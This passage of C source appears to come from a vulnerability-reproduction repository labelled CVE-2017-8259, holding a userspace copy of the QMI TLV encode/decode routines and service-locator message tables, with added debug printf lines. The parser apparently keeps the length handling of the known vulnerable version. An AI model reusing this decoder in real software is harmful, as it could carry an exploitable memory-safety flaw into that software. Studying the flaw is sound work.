		case QMI_SIGNED_2_BYTE_ENUM:
		case QMI_SIGNED_4_BYTE_ENUM:
			printf("encoding byte num\n");
			/* Check to avoid out of range buffer access */
			if (((data_len_value * temp_ei->elem_size) +
			    encoded_bytes + TLV_LEN_SIZE + TLV_TYPE_SIZE) >
			    out_buf_len) {
				printf("%s: Too Small Buffer @data_type:%d\n",
					__func__, temp_ei->data_type);
				return -ETOOSMALL;
			}
			rc = qmi_encode_basic_elem(buf_dst, buf_src,
				data_len_value, temp_ei->elem_size);
			QMI_ENCODE_LOG_ELEM(enc_level, data_len_value,
				temp_ei->elem_size, buf_src);
			UPDATE_ENCODE_VARIABLES(temp_ei, buf_dst,
				encoded_bytes, tlv_len, encode_tlv, rc);
			break;

		case QMI_STRUCT:
			printf("encoding struct\n");
			rc = qmi_encode_struct_elem(temp_ei, buf_dst, buf_src,
				data_len_value, (out_buf_len - encoded_bytes),
				(enc_level + 1));
			if (rc < 0)
				return rc;
			UPDATE_ENCODE_VARIABLES(temp_ei, buf_dst,
				encoded_bytes, tlv_len, encode_tlv, rc);
			break;

		case QMI_STRING:
			printf("doing string enc_level %d\n", enc_level);
			rc = qmi_encode_string_elem(temp_ei, buf_dst, buf_src,
				out_buf_len - encoded_bytes, enc_level);
			if (rc < 0)
				return rc;
			UPDATE_ENCODE_VARIABLES(temp_ei, buf_dst,
				encoded_bytes, tlv_len, encode_tlv, rc);
			break;
		default:
			printf("%s: Unrecognized data type\n", __func__);
			return -EINVAL;

		}

		if (encode_tlv && enc_level == 1) {
			printf("encoding tlv\n");
			QMI_ENCDEC_ENCODE_TLV(tlv_type, tlv_len, tlv_pointer);
			QMI_ENCODE_LOG_TLV(tlv_type, tlv_len);
			encoded_bytes += (TLV_TYPE_SIZE + TLV_LEN_SIZE);
			tlv_pointer = buf_dst;
			tlv_len = 0;
			buf_dst = buf_dst + TLV_LEN_SIZE + TLV_TYPE_SIZE;
			encode_tlv = 0;
		}
	}
	//QMI_ENCODE_LOG_MSG(out_buf, encoded_bytes);
	return encoded_bytes;
}

/**
 * qmi_kernel_decode() - Decode to C Structure format
 * @desc: Pointer to structure descriptor.
 * @out_c_struct: Buffer to hold the decoded C structure.
 * @in_buf: Buffer containg the QMI message to be decoded.
 * @in_buf_len: Length of the incoming QMI message.
 *
 * @return: 0 on success, < 0 on error.
 */
int qmi_kernel_decode(struct msg_desc *desc, void *out_c_struct,
		      void *in_buf, uint32_t in_buf_len)
{
	int dec_level = 1;
	int rc = 0;

	if (!desc || !desc->ei_array) {
		printf("dcode desc ei_array\n");
		return -EINVAL;
	}

	if (!out_c_struct || !in_buf || !in_buf_len) {
		printf("out cstruct in buf in_buf_len\n");
		return -EINVAL;
	}

	if (desc->max_msg_len < in_buf_len) {
		printf("size shit\n");
		return -EINVAL;
	}

	rc = _qmi_kernel_decode(desc->ei_array, out_c_struct,
				in_buf, in_buf_len, dec_level);
	if (rc < 0)
		return rc;
	else
		return 0;
}

/**
 * qmi_decode_basic_elem() - Decodes elements of basic/primary data type
 * @buf_dst: Buffer to store the decoded element.
 * @buf_src: Buffer containing the elements in QMI wire format.
 * @elem_len: Number of elements to be decoded.
 * @elem_size: Size of a single instance of the element to be decoded.
 *
 * @return: Total size of the decoded data elements, in bytes.
 *
 * This function decodes the "elem_len" number of elements in QMI wire format,
 * each of size "elem_size" bytes from the source buffer "buf_src" and stores
 * the decoded elements in the destination buffer "buf_dst". The elements are
 * of primary data type which include uint8_t - uint64_t or similar. This
 * function returns the number of bytes of decoded information.
 */
static int qmi_decode_basic_elem(void *buf_dst, void *buf_src,
				 uint32_t elem_len, uint32_t elem_size)
{
	uint32_t i, rc = 0;

	for (i = 0; i < elem_len; i++) {
		QMI_ENCDEC_DECODE_N_BYTES(buf_dst, buf_src, elem_size);
		rc += elem_size;
	}

	return rc;
}

/**
 * qmi_decode_struct_elem() - Decodes elements of struct data type
 * @ei_array: Struct info array descibing the struct element.
 * @buf_dst: Buffer to store the decoded element.
 * @buf_src: Buffer containing the elements in QMI wire format.
 * @elem_len: Number of elements to be decoded.
 * @tlv_len: Total size of the encoded inforation corresponding to
 *           this struct element.
 * @dec_level: Depth of the nested structure from the main structure.
 *
 * @return: Total size of the decoded data elements, on success.
 *          < 0 on error.
 *
 * This function decodes the "elem_len" number of elements in QMI wire format,
 * each of size "(tlv_len/elem_len)" bytes from the source buffer "buf_src"
 * and stores the decoded elements in the destination buffer "buf_dst". The
 * elements are of struct data type which includes any C structure. This
 * function returns the number of bytes of decoded information.
 */
static int qmi_decode_struct_elem(struct elem_info *ei_array, void *buf_dst,
				  void *buf_src, uint32_t elem_len,
				  uint32_t tlv_len, int dec_level)
{
	int i, rc, decoded_bytes = 0;
	struct elem_info *temp_ei = ei_array;

	for (i = 0; i < elem_len && decoded_bytes < tlv_len; i++) {
		rc = _qmi_kernel_decode(temp_ei->ei_array, buf_dst, buf_src,
					(tlv_len - decoded_bytes), dec_level);
		if (rc < 0)
			return rc;
		buf_src = buf_src + rc;
		buf_dst = buf_dst + temp_ei->elem_size;
		decoded_bytes += rc;
	}

	if ((dec_level <= 2 && decoded_bytes != tlv_len) ||
	    (dec_level > 2 && (i < elem_len || decoded_bytes > tlv_len))) {
		printf("%s: Fault in decoding: dl(%d), db(%d), tl(%d), i(%d), el(%d)\n",
			__func__, dec_level, decoded_bytes, tlv_len,
			i, elem_len);
		return -EFAULT;
	}
	return decoded_bytes;
}

/**
 * qmi_decode_string_elem() - Decodes elements of string data type
 * @ei_array: Struct info array descibing the string element.
 * @buf_dst: Buffer to store the decoded element.
 * @buf_src: Buffer containing the elements in QMI wire format.
 * @tlv_len: Total size of the encoded inforation corresponding to
 *           this string element.
 * @dec_level: Depth of the string element from the main structure.
 *
 * @return: Total size of the decoded data elements, on success.
 *          < 0 on error.
 *
 * This function decodes the string element of maximum length
 * "ei_array->elem_len" from the source buffer "buf_src" and puts it into
 * the destination buffer "buf_dst". This function returns number of bytes
 * decoded from the input buffer.
 */
static int qmi_decode_string_elem(struct elem_info *ei_array, void *buf_dst,
				  void *buf_src, uint32_t tlv_len,
				  int dec_level)
{
	int rc;
	int decoded_bytes = 0;
	uint32_t string_len = 0;
	uint32_t string_len_sz = 0;
	struct elem_info *temp_ei = ei_array;

	if (dec_level == 1) {
		string_len = tlv_len;
	} else {
		string_len_sz = temp_ei->elem_len <= U8_MAX ?
				sizeof(uint8_t) : sizeof(uint16_t);
		rc = qmi_decode_basic_elem(&string_len, buf_src,
					   1, string_len_sz);
		decoded_bytes += rc;
	}

	if (string_len > temp_ei->elem_len) {
		printf("%s: String len %d > Max Len %d\n",
			__func__, string_len, temp_ei->elem_len);
		return -ETOOSMALL;
	} else if (string_len > tlv_len) {
		printf("%s: String len %d > Input Buffer Len %d\n",
			__func__, string_len, tlv_len);
		return -EFAULT;
	}

	rc = qmi_decode_basic_elem(buf_dst, buf_src + decoded_bytes,
				   string_len, temp_ei->elem_size);
	*((char *)buf_dst + string_len) = '\0';
	decoded_bytes += rc;
	QMI_DECODE_LOG_ELEM(dec_level, string_len, temp_ei->elem_size, buf_dst);
	return decoded_bytes;
}

/**
 * find_ei() - Find element info corresponding to TLV Type
 * @ei_array: Struct info array of the message being decoded.
 * @type: TLV Type of the element being searched.
 *
 * @return: Pointer to struct info, if found
 *
 * Every element that got encoded in the QMI message will have a type
 * information associated with it. While decoding the QMI message,
 * this function is used to find the struct info regarding the element
 * that corresponds to the type being decoded.
 */
static struct elem_info *find_ei(struct elem_info *ei_array,
				   uint32_t type)
{
	struct elem_info *temp_ei = ei_array;
	printf("about to hop into find_ei wile\n");
	while (temp_ei->data_type != QMI_EOTI) {
		printf("temp_ei->tlv_type %hu and param type %hu\n",
		       (uint8_t)temp_ei->tlv_type, (uint8_t)type);
		if (temp_ei->tlv_type == (uint8_t)type)
			return temp_ei;
		temp_ei = temp_ei + 1;
	}
	return NULL;
}

/**
 * _qmi_kernel_decode() - Core Decode Function
 * @ei_array: Struct info array describing the structure to be decoded.
 * @out_c_struct: Buffer to hold the decoded C struct
 * @in_buf: Buffer containing the QMI message to be decoded
 * @in_buf_len: Length of the QMI message to be decoded
 * @dec_level: Decode level to indicate the depth of the nested structure,
 *             within the main structure, being decoded
 *
 * @return: Number of bytes of decoded information, on success
 *          < 0 on error.
 */
static int _qmi_kernel_decode(struct elem_info *ei_array,
			      void *out_c_struct,
			      void *in_buf, uint32_t in_buf_len,
			      int dec_level)
{
	struct elem_info *temp_ei = ei_array;
	uint8_t opt_flag_value = 1;
	uint32_t data_len_value = 0, data_len_sz = 0;
	uint8_t *buf_dst = out_c_struct;
	uint8_t *tlv_pointer;
	uint32_t tlv_len = 0;
	uint32_t tlv_type;
	uint32_t decoded_bytes = 0;
	void *buf_src = in_buf;
	int rc;

	QMI_DECODE_LOG_MSG(in_buf, in_buf_len);
	while (decoded_bytes < in_buf_len) {
		printf("loop dec_level %d\n", dec_level);
		if (dec_level >= 2 && temp_ei->data_type == QMI_EOTI)
			return decoded_bytes;

		if (dec_level == 1) {
			tlv_pointer = buf_src;
			QMI_ENCDEC_DECODE_TLV(&tlv_type,
					      &tlv_len, tlv_pointer);
			QMI_DECODE_LOG_TLV(tlv_type, tlv_len);
			buf_src += (TLV_TYPE_SIZE + TLV_LEN_SIZE);
			decoded_bytes += (TLV_TYPE_SIZE + TLV_LEN_SIZE);
			temp_ei = find_ei(ei_array, tlv_type);
			if (!temp_ei && (tlv_type < OPTIONAL_TLV_TYPE_START)) {
				printf("%s: Inval element info %p and tlv_type %d\n", __func__, temp_ei, tlv_type);
				return -EINVAL;
			} else if (!temp_ei) {
				UPDATE_DECODE_VARIABLES(buf_src,
						decoded_bytes, tlv_len);
				continue;
			}
		} else {
			/*
			 * No length information for elements in nested
			 * structures. So use remaining decodable buffer space.
			 */
			tlv_len = in_buf_len - decoded_bytes;
		}

		buf_dst = out_c_struct + temp_ei->offset;
		if (temp_ei->data_type == QMI_OPT_FLAG) {
			memcpy(buf_dst, &opt_flag_value, sizeof(uint8_t));
			temp_ei = temp_ei + 1;
			buf_dst = out_c_struct + temp_ei->offset;
		}

		if (temp_ei->data_type == QMI_DATA_LEN) {
			data_len_sz = temp_ei->elem_size == sizeof(uint8_t) ?
					sizeof(uint8_t) : sizeof(uint16_t);
			rc = qmi_decode_basic_elem(&data_len_value, buf_src,
						   1, data_len_sz);
			memcpy(buf_dst, &data_len_value, sizeof(uint32_t));
			temp_ei = temp_ei + 1;
			buf_dst = out_c_struct + temp_ei->offset;
			tlv_len -= data_len_sz;
			UPDATE_DECODE_VARIABLES(buf_src, decoded_bytes, rc);
		}

		if (temp_ei->is_array == NO_ARRAY) {
			data_len_value = 1;
		} else if (temp_ei->is_array == STATIC_ARRAY) {
			data_len_value = temp_ei->elem_len;
		} else if (data_len_value > temp_ei->elem_len) {
			printf("%s: Data len %d > max spec %d\n",
				__func__, data_len_value, temp_ei->elem_len);
			return -ETOOSMALL;
		}

		switch (temp_ei->data_type) {
		case QMI_UNSIGNED_1_BYTE:
		case QMI_UNSIGNED_2_BYTE:
		case QMI_UNSIGNED_4_BYTE:
		case QMI_UNSIGNED_8_BYTE:
		case QMI_SIGNED_2_BYTE_ENUM:
		case QMI_SIGNED_4_BYTE_ENUM:
			rc = qmi_decode_basic_elem(buf_dst, buf_src,
				data_len_value, temp_ei->elem_size);
			QMI_DECODE_LOG_ELEM(dec_level, data_len_value,
				temp_ei->elem_size, buf_dst);
			UPDATE_DECODE_VARIABLES(buf_src, decoded_bytes, rc);
			break;

		case QMI_STRUCT:
			printf("doing struct with dec level %d\n", dec_level);
			rc = qmi_decode_struct_elem(temp_ei, buf_dst, buf_src,
				data_len_value, tlv_len, (dec_level + 1));
			if (rc < 0)
				return rc;
			UPDATE_DECODE_VARIABLES(buf_src, decoded_bytes, rc);
			break;

		case QMI_STRING:
			rc = qmi_decode_string_elem(temp_ei, buf_dst, buf_src,
						     tlv_len, dec_level);
			if (rc < 0)
				return rc;
			UPDATE_DECODE_VARIABLES(buf_src, decoded_bytes, rc);
			break;

		default:
			printf("%s: Unrecognized data type\n", __func__);
			return -EINVAL;
		}
		temp_ei = temp_ei + 1;
	}
	return decoded_bytes;
}


```

`CVE-2017-8259/qmi_encdec.h`:

```h
/* Copyright (c) 2012-2014, The Linux Foundation. All rights reserved.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 and
 * only version 2 as published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 */
#include <stdio.h>
#include <stdlib.h>
#include <inttypes.h>
#include <stdbool.h>

#define QMI_REQUEST_CONTROL_FLAG 0x00
#define QMI_RESPONSE_CONTROL_FLAG 0x02
#define QMI_INDICATION_CONTROL_FLAG 0x04
#define QMI_HEADER_SIZE 7

/**
 * elem_type - Enum to identify the data type of elements in a data
 *             structure.
 */
enum elem_type {
	QMI_OPT_FLAG = 1,
	QMI_DATA_LEN,
	QMI_UNSIGNED_1_BYTE,
	QMI_UNSIGNED_2_BYTE,
	QMI_UNSIGNED_4_BYTE,
	QMI_UNSIGNED_8_BYTE,
	QMI_SIGNED_2_BYTE_ENUM,
	QMI_SIGNED_4_BYTE_ENUM,
	QMI_STRUCT,
	QMI_STRING,
	QMI_EOTI,
};

/**
 * array_type - Enum to identify if an element in a data structure is
 *              an array. If so, then is it a static length array or a
 *              variable length array.
 */
enum array_type {
	NO_ARRAY = 0,
	STATIC_ARRAY = 1,
	VAR_LEN_ARRAY = 2,
};

/**
 * elem_info - Data structure to specify information about an element
 *               in a data structure. An array of this data structure
 *               can be used to specify info about a complex data
 *               structure to be encoded/decoded.
 *
 * @data_type: Data type of this element.
 * @elem_len: Array length of this element, if an array.
 * @elem_size: Size of a single instance of this data type.
 * @is_array: Array type of this element.
 * @tlv_type: QMI message specific type to identify which element
 *            is present in an incoming message.
 * @offset: To identify the address of the first instance of this
 *          element in the data structure.
 * @ei_array: Array to provide information about the nested structure
 *            within a data structure to be encoded/decoded.
 */
struct elem_info {
	enum elem_type data_type;
	uint32_t elem_len;
	uint32_t elem_size;
	enum array_type is_array;
	uint8_t tlv_type;
	uint32_t offset;
	struct elem_info *ei_array;
};

/**
 * @msg_desc - Describe about the main/outer structure to be
 *		  encoded/decoded.
 *
 * @max_msg_len: Maximum possible length of the QMI message.
 * @ei_array: Array to provide information about a data structure.
 */
struct msg_desc {
	uint16_t msg_id;
	int max_msg_len;
	struct elem_info *ei_array;
};

struct qmi_header {
	unsigned char cntl_flag;
	uint16_t txn_id;
	uint16_t msg_id;
	uint16_t msg_len;
} __attribute__((__packed__));

static inline void encode_qmi_header(unsigned char *buf,
			unsigned char cntl_flag, uint16_t txn_id,
			uint16_t msg_id, uint16_t msg_len)
{
	struct qmi_header *hdr = (struct qmi_header *)buf;

	hdr->cntl_flag = cntl_flag;
	hdr->txn_id = txn_id;
	hdr->msg_id = msg_id;
	hdr->msg_len = msg_len;
}

static inline void decode_qmi_header(unsigned char *buf,
			unsigned char *cntl_flag, uint16_t *txn_id,
			uint16_t *msg_id, uint16_t *msg_len)
{
	struct qmi_header *hdr = (struct qmi_header *)buf;

	*cntl_flag = hdr->cntl_flag;
	*txn_id = hdr->txn_id;
	*msg_id = hdr->msg_id;
	*msg_len = hdr->msg_len;
}

/**
 * qmi_kernel_encode() - Encode to QMI message wire format
 * @desc: Pointer to structure descriptor.
 * @out_buf: Buffer to hold the encoded QMI message.
 * @out_buf_len: Length of the out buffer.
 * @in_c_struct: C Structure to be encoded.
 *
 * @return: size of encoded message on success, < 0 on error.
 */
int qmi_kernel_encode(struct msg_desc *desc,
		      void *out_buf, uint32_t out_buf_len,
		      void *in_c_struct);

/**
 * qmi_kernel_decode() - Decode to C Structure format
 * @desc: Pointer to structure descriptor.
 * @out_c_struct: Buffer to hold the decoded C structure.
 * @in_buf: Buffer containg the QMI message to be decoded.
 * @in_buf_len: Length of the incoming QMI message.
 *
 * @return: 0 on success, < 0 on error.
 */
int qmi_kernel_decode(struct msg_desc *desc, void *out_c_struct,
		      void *in_buf, uint32_t in_buf_len);

/**
 * qmi_verify_max_msg_len() - Verify the maximum length of a QMI message
 * @desc: Pointer to structure descriptor.
 *
 * @return: true if the maximum message length embedded in structure
 *          descriptor matches the calculated value, else false.
 */
bool qmi_verify_max_msg_len(struct msg_desc *desc);




```

`CVE-2017-8259/qmi_encdec_priv.h`:

```h
/* Copyright (c) 2012, The Linux Foundation. All rights reserved.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 and
 * only version 2 as published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 */

#ifndef _QMI_ENCDEC_PRIV_H_
#define _QMI_ENCDEC_PRIV_H_

#define QMI_ENCDEC_ENCODE_TLV(type, length, p_dst) do { \
	*p_dst++ = type; \
	*p_dst++ = ((uint8_t)((length) & 0xFF)); \
	*p_dst++ = ((uint8_t)(((length) >> 8) & 0xFF)); \
} while (0)

#define QMI_ENCDEC_DECODE_TLV(p_type, p_length, p_src) do { \
	*p_type = (uint8_t)*p_src++; \
	*p_length = (uint8_t)*p_src++; \
	*p_length |= ((uint8_t)*p_src) << 8; \
} while (0)

#define QMI_ENCDEC_ENCODE_N_BYTES(p_dst, p_src, size) \
do { \
	memcpy(p_dst, p_src, size); \
	p_dst = (uint8_t *)p_dst + size; \
	p_src = (uint8_t *)p_src + size; \
} while (0)

#define QMI_ENCDEC_DECODE_N_BYTES(p_dst, p_src, size) \
do { \
	memcpy(p_dst, p_src, size); \
	p_dst = (uint8_t *)p_dst + size; \
	p_src = (uint8_t *)p_src + size; \
} while (0)

#define UPDATE_ENCODE_VARIABLES(temp_si, buf_dst, \
				encoded_bytes, tlv_len, encode_tlv, rc) \
do { \
	buf_dst = (uint8_t *)buf_dst + rc; \
	encoded_bytes += rc; \
	tlv_len += rc; \
	temp_si = temp_si + 1; \
	encode_tlv = 1; \
} while (0)

#define UPDATE_DECODE_VARIABLES(buf_src, decoded_bytes, rc) \
do { \
	buf_src = (uint8_t *)buf_src + rc; \
	decoded_bytes += rc; \
} while (0)

#endif

```

`CVE-2017-8259/service-locator-private.h`:

```h
/*
 * Copyright (c) 2015, The Linux Foundation. All rights reserved.
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 and
 * only version 2 as published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 */
#ifndef SERVICE_LOCATOR_V01_H
#define SERVICE_LOCATOR_V01_H

#define QMI_COMMON_TLV_TYPE 0


enum qmi_result_type_v01 {
	/* To force a 32 bit signed enum. Do not change or use*/
	QMI_RESULT_TYPE_MIN_ENUM_VAL_V01 = INT_MIN,
	QMI_RESULT_SUCCESS_V01 = 0,
	QMI_RESULT_FAILURE_V01 = 1,
	QMI_RESULT_TYPE_MAX_ENUM_VAL_V01 = INT_MAX,
};

enum qmi_error_type_v01 {
	/* To force a 32 bit signed enum. Do not change or use*/
	QMI_ERR_TYPE_MIN_ENUM_VAL_V01 = INT_MIN,
	QMI_ERR_NONE_V01 = 0x0000,
	QMI_ERR_MALFORMED_MSG_V01 = 0x0001,
	QMI_ERR_NO_MEMORY_V01 = 0x0002,
	QMI_ERR_INTERNAL_V01 = 0x0003,
	QMI_ERR_CLIENT_IDS_EXHAUSTED_V01 = 0x0005,
	QMI_ERR_INVALID_ID_V01 = 0x0029,
	QMI_ERR_ENCODING_V01 = 0x003A,
	QMI_ERR_INCOMPATIBLE_STATE_V01 = 0x005A,
	QMI_ERR_NOT_SUPPORTED_V01 = 0x005E,
	QMI_ERR_TYPE_MAX_ENUM_VAL_V01 = INT_MAX,
};

#define QMI_SERVREG_LOC_NAME_LENGTH_V01 64
#define QMI_SERVREG_LOC_LIST_LENGTH_V01 32


struct servreg_loc_entry_v01 {
	char name[QMI_SERVREG_LOC_NAME_LENGTH_V01 + 1];
	uint32_t instance_id;
	uint8_t service_data_valid;
	uint32_t service_data;
};

struct qmi_response_type_v01 {
	enum qmi_result_type_v01 result;
	enum qmi_error_type_v01 error;
};
struct elem_info qmi_response_type_v01_ei[] = {
	{
		.data_type      = QMI_SIGNED_2_BYTE_ENUM,
		.elem_len       = 1,
		.elem_size      = sizeof(uint16_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
		.offset         = offsetof(struct qmi_response_type_v01,
					   result),
		.ei_array       = NULL,
	},
	{
		.data_type      = QMI_SIGNED_2_BYTE_ENUM,
		.elem_len       = 1,
		.elem_size      = sizeof(uint16_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
		.offset         = offsetof(struct qmi_response_type_v01,
					   error),
		.ei_array       = NULL,
	},
	{
		.data_type      = QMI_EOTI,
		.elem_len       = 0,
		.elem_size      = 0,
		.is_array       = NO_ARRAY,
		.tlv_type       = QMI_COMMON_TLV_TYPE,
		.offset         = 0,
		.ei_array       = NULL,
	},
};
#define get_qmi_response_type_v01_ei() qmi_response_type_v01_ei



#define SERVREG_LOC_SERVICE_ID_V01 0x40
#define SERVREG_LOC_SERVICE_VERS_V01 0x01

#define QMI_SERVREG_LOC_INDICATION_REGISTER_RESP_V01 0x0020
#define QMI_SERVREG_LOC_REGISTER_SERVICE_LIST_REQ_V01 0x0022
#define QMI_SERVREG_LOC_GET_DOMAIN_LIST_REQ_V01 0x0021
#define QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_V01 0x0021
#define QMI_SERVREG_LOC_DATABASE_UPDATED_IND_V01 0x0023
#define QMI_SERVREG_LOC_INDICATION_REGISTER_REQ_V01 0x0020
#define QMI_SERVREG_LOC_REGISTER_SERVICE_LIST_RESP_V01 0x0022

#define QMI_SERVREG_LOC_NAME_LENGTH_V01 64
#define QMI_SERVREG_LOC_LIST_LENGTH_V01 32

enum qmi_servreg_loc_service_instance_enum_type_v01 {
	QMI_SERVREG_LOC_SERVICE_INSTANCE_ENUM_TYPE_MIN_VAL_V01 = INT_MIN,
	QMI_SERVREG_LOC_SERVICE_INSTANCE_APSS_V01 = 0x1,
	QMI_SERVREG_LOC_SERVICE_INSTANCE_ENUM_TYPE_MAX_VAL_V01 = INT_MAX,
};

struct qmi_servreg_loc_indication_register_req_msg_v01 {
	uint8_t enable_database_updated_indication_valid;
	uint8_t enable_database_updated_indication;
};
#define QMI_SERVREG_LOC_INDICATION_REGISTER_REQ_MSG_V01_MAX_MSG_LEN 4
struct elem_info qmi_servreg_loc_indication_register_req_msg_v01_ei[];

struct qmi_servreg_loc_indication_register_resp_msg_v01 {
	struct qmi_response_type_v01 resp;
};
#define QMI_SERVREG_LOC_INDICATION_REGISTER_RESP_MSG_V01_MAX_MSG_LEN 7
struct elem_info qmi_servreg_loc_indication_register_resp_msg_v01_ei[];

struct qmi_servreg_loc_get_domain_list_req_msg_v01 {
	char service_name[QMI_SERVREG_LOC_NAME_LENGTH_V01 + 1];
	uint8_t domain_offset_valid;
	uint32_t domain_offset;
};
#define QMI_SERVREG_LOC_GET_DOMAIN_LIST_REQ_MSG_V01_MAX_MSG_LEN 74
struct elem_info qmi_servreg_loc_get_domain_list_req_msg_v01_ei[];

struct qmi_servreg_loc_get_domain_list_resp_msg_v01 {
	struct qmi_response_type_v01 resp;
	uint8_t total_domains_valid;
	uint16_t total_domains;
	uint8_t db_rev_count_valid;
	uint16_t db_rev_count;
	uint8_t domain_list_valid;
	uint32_t domain_list_len;
	struct servreg_loc_entry_v01
				domain_list[QMI_SERVREG_LOC_LIST_LENGTH_V01];
};
#define QMI_SERVREG_LOC_GET_DOMAIN_LIST_RESP_MSG_V01_MAX_MSG_LEN 2389
struct elem_info qmi_servreg_loc_get_domain_list_resp_msg_v01_ei[];

struct qmi_servreg_loc_register_service_list_req_msg_v01 {
	char domain_name[QMI_SERVREG_LOC_NAME_LENGTH_V01 + 1];
	uint32_t service_list_len;
	struct servreg_loc_entry_v01
				service_list[QMI_SERVREG_LOC_LIST_LENGTH_V01];
};
#define QMI_SERVREG_LOC_REGISTER_SERVICE_LIST_REQ_MSG_V01_MAX_MSG_LEN 2439
struct elem_info qmi_servreg_loc_register_service_list_req_msg_v01_ei[];

struct qmi_servreg_loc_register_service_list_resp_msg_v01 {
	struct qmi_response_type_v01 resp;
};
#define QMI_SERVREG_LOC_REGISTER_SERVICE_LIST_RESP_MSG_V01_MAX_MSG_LEN 7
struct elem_info qmi_servreg_loc_register_service_list_resp_msg_v01_ei[];

struct qmi_servreg_loc_database_updated_ind_msg_v01 {
	char placeholder;
};
#define QMI_SERVREG_LOC_DATABASE_UPDATED_IND_MSG_V01_MAX_MSG_LEN 0
struct elem_info qmi_servreg_loc_database_updated_ind_msg_v01_ei[];

#define QMI_EOTI_DATA_TYPE	\
{				\
	.data_type = QMI_EOTI,	\
	.elem_len  = 0,		\
	.elem_size = 0,		\
	.is_array  = NO_ARRAY,	\
	.tlv_type  = 0x00,	\
	.offset    = 0,		\
	.ei_array  = NULL,	\
},

static struct elem_info servreg_loc_entry_v01_ei[] = {
	{
		.data_type      = QMI_STRING,
		.elem_len       = QMI_SERVREG_LOC_NAME_LENGTH_V01 + 1,
		.elem_size      = sizeof(char),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0,
		.offset         = offsetof(struct servreg_loc_entry_v01,
					   name),
	},
	{
		.data_type      = QMI_UNSIGNED_4_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint32_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0,
		.offset         = offsetof(struct servreg_loc_entry_v01,
					   instance_id),
	},
	{
		.data_type      = QMI_UNSIGNED_1_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0,
		.offset         = offsetof(struct servreg_loc_entry_v01,
					   service_data_valid),
	},
	{
		.data_type      = QMI_UNSIGNED_4_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint32_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0,
		.offset         = offsetof(struct servreg_loc_entry_v01,
					   service_data),
	},
	QMI_EOTI_DATA_TYPE
};

struct elem_info qmi_servreg_loc_indication_register_req_msg_v01_ei[] = {
	{
		.data_type      = QMI_OPT_FLAG,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x10,
		.offset         = offsetof(struct
				qmi_servreg_loc_indication_register_req_msg_v01,
				enable_database_updated_indication_valid),
	},
	{
		.data_type      = QMI_UNSIGNED_1_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x10,
		.offset         = offsetof(struct
				qmi_servreg_loc_indication_register_req_msg_v01,
				enable_database_updated_indication),
	},
	QMI_EOTI_DATA_TYPE
};

struct elem_info qmi_servreg_loc_indication_register_resp_msg_v01_ei[] = {
	{
		.data_type      = QMI_STRUCT,
		.elem_len       = 1,
		.elem_size      = sizeof(struct qmi_response_type_v01),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x02,
		.offset         = offsetof(struct
			qmi_servreg_loc_indication_register_resp_msg_v01,
			resp),
		.ei_array      = get_qmi_response_type_v01_ei(),
	},
	QMI_EOTI_DATA_TYPE
};

struct elem_info qmi_servreg_loc_get_domain_list_req_msg_v01_ei[] = {
	{
		.data_type      = QMI_STRING,
		.elem_len       = QMI_SERVREG_LOC_NAME_LENGTH_V01 + 1,
		.elem_size      = sizeof(char),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x01,
		.offset         = offsetof(struct
				qmi_servreg_loc_get_domain_list_req_msg_v01,
				service_name),
	},
	{
		.data_type      = QMI_OPT_FLAG,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x10,
		.offset         = offsetof(struct
				qmi_servreg_loc_get_domain_list_req_msg_v01,
				domain_offset_valid),
	},
	{
		.data_type      = QMI_UNSIGNED_4_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint32_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x10,
		.offset         = offsetof(struct
				qmi_servreg_loc_get_domain_list_req_msg_v01,
				domain_offset),
	},
	QMI_EOTI_DATA_TYPE
};

struct elem_info qmi_servreg_loc_get_domain_list_resp_msg_v01_ei[] = {
	{
		.data_type      = QMI_STRUCT,
		.elem_len       = 1,
		.elem_size      = sizeof(struct qmi_response_type_v01),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x02,
		.offset         = offsetof(struct
				qmi_servreg_loc_get_domain_list_resp_msg_v01,
				resp),
		.ei_array      = get_qmi_response_type_v01_ei(),
	},
	{
		.data_type      = QMI_OPT_FLAG,
		.elem_len       = 1,
		.elem_size      = sizeof(uint8_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x10,
		.offset         = offsetof(struct
				qmi_servreg_loc_get_domain_list_resp_msg_v01,
				total_domains_valid),
	},
	{
		.data_type      = QMI_UNSIGNED_2_BYTE,
		.elem_len       = 1,
		.elem_size      = sizeof(uint16_t),
		.is_array       = NO_ARRAY,
		.tlv_type       = 0x10,
		.offset         = offsetof(struct
